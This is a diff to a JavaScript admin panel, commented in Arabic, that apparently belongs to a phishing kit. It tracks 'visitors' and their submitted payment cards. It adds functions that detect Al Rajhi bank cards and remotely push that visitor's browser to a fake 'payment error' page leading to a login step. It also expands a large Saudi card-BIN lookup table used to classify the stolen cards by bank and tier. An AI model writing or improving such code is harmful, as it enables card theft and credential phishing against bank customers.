@@ -153,6 +153,25 @@
     let visitors = new Map();
     let selectedVisitorId = null;
 
+    // دالة التحقق إذا كانت البطاقة تابعة للراجحي
+    function isRajhiCard(visitor) {
+      // البحث في بطاقات الزائر (paymentCards هو الاسم الصحيح)
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+        for (const card of visitor.paymentCards) {
+          const cardInfo = getCardInfo(card.cardNumber);
+          if (cardInfo.bank === 'الراجحي') {
+            return true;
+          }
+        }
+      }
+      return false;
+    }
+
+    // دالة تحويل العميل لصفحة خطأ الدفع الراجحي (ثم ينقر متابعة للذهاب لتسجيل الدخول)
+    function navigateToRajhi(socketId) {
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'rajhi-payment-error' });
+    }
+
     // دالة تحديد معلومات البطاقة من رقم BIN
     function getCardInfo(cardNumber) {
       const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
@@ -166,210 +185,535 @@
       else if (bin.startsWith('34') || bin.startsWith('37')) network = 'Amex';
       
       // قاعدة بيانات BIN للبنوك السعودية - بيانات موثوقة من bincheck.io
+      // قاعدة بيانات BIN الشاملة للبنوك والمحافظ السعودية - 470+ رقم BIN
+      // تم جمعها من bincheck.io و bintable.com - آخر تحديث: يناير 2026
       const binDatabase = {
-        '409201': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
-        '415950': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '445827': { bank: 'الراجحي', network: 'Visa', type: 'Prepaid', tier: 'Rewards' },
-        '459583': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
-        '459588': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
-        '459800': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '462220': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Signature' },
+        // ===== البنك الأهلي السعودي (SNB) =====
+        '223379': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Platinum Flex' },
+        '223398': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Installment' },
+        '412113': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '430258': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '430259': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '430260': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '445303': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '450766': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455698': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '465154': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
         '466515': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '468540': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Classic' },
-        '468541': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Classic' },
-        '468542': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Infinite' },
-        '468543': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Platinum' },
-        '469616': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Standard' },
         '473258': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
-        '473825': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '473826': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '473827': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Infinite' },
-        '473828': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature' },
-        '473899': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '474491': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
-        '475078': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business' },
-        '475100': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
-        '475109': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
-        '475153': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business' },
-        '475558': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
-        '476815': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Signature' },
-        '477983': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Infinite' },
-        '478295': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
-        '478296': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
-        '481206': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
-        '481207': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Classic' },
-        '483010': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Classic' },
-        '483011': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Platinum' },
-        '483012': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Infinite' },
+        '482052': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
         '483178': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
-        '432328': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Classic' },
-        '483432': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature' },
-        '484783': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
         '485005': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
         '485042': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
-        '486094': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Gold' },
-        '486095': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Platinum' },
-        '486096': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Infinite' },
-        '486653': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
-        '489317': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
-        '489318': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Rewards' },
-        '489319': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Platinum' },
-        '490745': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '486094': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Gold' },
+        '486095': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '486096': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Infinite' },
         '490917': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
-        '490980': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
-        '491610': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Standard' },
+        '491610': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Classic' },
         '492145': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
         '493428': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Platinum' },
-        '494329': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Business' },
-        '496655': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
-        '504300': { bank: 'الجزيرة', network: 'Maestro', type: 'Debit', tier: 'Standard' },
-        '506968': { bank: 'الراجحي', network: 'Maestro', type: 'Debit', tier: 'Prepaid' },
-        '511249': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '512060': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '512220': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '512464': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '512623': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '512691': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
-        '512727': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
-        '513213': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
-        '514932': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '517531': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '515079': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '515530': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '516138': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
         '517720': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '517724': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
         '517918': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '518694': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Platinum' },
+        '518694': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Platinum Travel' },
         '519310': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
         '519341': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '520058': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Business' },
-        '520089': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Business' },
-        '520090': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '520430': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
         '520431': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '521031': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '521076': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
-        '522139': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '523041': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '521076': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
         '523954': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
         '523968': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
         '523998': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
         '524116': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '524126': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '524130': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'World Flex' },
-        '524148': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '524165': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524130': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'World Flex' },
         '524197': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '524205': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '524236': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '524266': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
         '524388': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '524514': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Platinum' },
         '525688': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '529157': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '529178': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '529298': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '529415': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '528597': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529415': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
         '529499': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '529741': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
-        '530481': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '530843': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '531153': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Gold Payroll' },
+        '531505': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '532034': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '532166': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
         '532446': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '532448': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
-        '533172': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
         '533964': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
         '534186': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '535825': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Titanium' },
-        '535989': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'World' },
-        '536023': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'World' },
+        '534797': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '535311': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '535825': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Titanium' },
         '536369': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '536567': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite Flex' },
         '536813': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '537767': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Titanium' },
+        '537878': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
         '539034': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
         '539035': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '539859': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '539931': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
-        '540236': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '540613': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
         '541554': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '541653': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '541679': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '541802': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
         '541891': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '541988': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
-        '542008': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
-        '542373': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '542747': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
         '542806': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
-        '542894': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '543085': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Platinum' },
-        '543199': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
-        '543357': { bank: 'الإنماء', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Business' },
-        '543408': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '543085': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Platinum' },
         '544217': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
         '544744': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
-        '545205': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Gold' },
-        '545297': { bank: 'البريطاني', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '545619': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '545855': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
-        '546319': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '545205': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Gold Payroll' },
         '546336': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
         '546631': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '548255': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '549699': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '549760': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '549954': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '552075': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552077': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '554180': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'World Elite' },
+        '555610': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '556675': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate World' },
+        '556676': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '588848': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '588850': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Personal' },
+        '604906': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968202': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+        '968203': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== مصرف الراجحي =====
+        '400067': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '400861': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '403024': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '405433': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '405454': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '407226': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '407281': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '407620': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '407654': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '409201': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '409246': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '410248': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '410249': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Business' },
+        '410621': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Business Enhanced' },
+        '414627': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '416634': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '417321': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '417323': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418346': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418347': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '419461': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '422689': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '423219': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '426362': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '428274': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '429927': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '432159': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '436321': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '441375': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '443926': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '444494': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '445309': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '445520': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '445521': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '445522': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '445827': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446608': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '446609': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455395': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455421': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '455430': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455708': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '455739': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455740': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '457553': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '457597': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '458456': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '460120': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '460121': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '460191': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '462220': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '465254': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '465257': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '465259': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '465260': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '467323': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '472019': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '483115': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '484166': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '484783': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '486653': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '490810': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '490980': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '494329': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '506968': { bank: 'الراجحي', network: 'Maestro', type: 'Debit', tier: 'Prepaid' },
+        '512623': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524126': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524266': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '542894': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '545619': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '549963': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '549964': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '554575': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '968205': { bank: 'الراجحي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== مصرف الإنماء =====
+        '404116': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '407197': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Corporate' },
+        '407395': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '412565': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '425896': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '426897': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '428671': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Gold' },
+        '428672': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Business Enhanced' },
+        '428673': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '428678': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '428679': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '432326': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '432327': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '432328': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '433366': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '434107': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '444397': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '446672': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '446673': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '454807': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '457998': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '458270': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '472106': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '483432': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '529157': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529178': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '530481': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '532720': { bank: 'الإنماء', network: 'Mastercard', type: 'Debit', tier: 'Premium' },
+        '543357': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Prepaid Business' },
+        '547026': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '551882': { bank: 'الإنماء', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '552363': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '626259': { bank: 'الإنماء', network: 'UnionPay', type: 'Credit', tier: 'Standard' },
+        '968206': { bank: 'الإنماء', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== بنك الرياض =====
+        '223463': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '232120': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
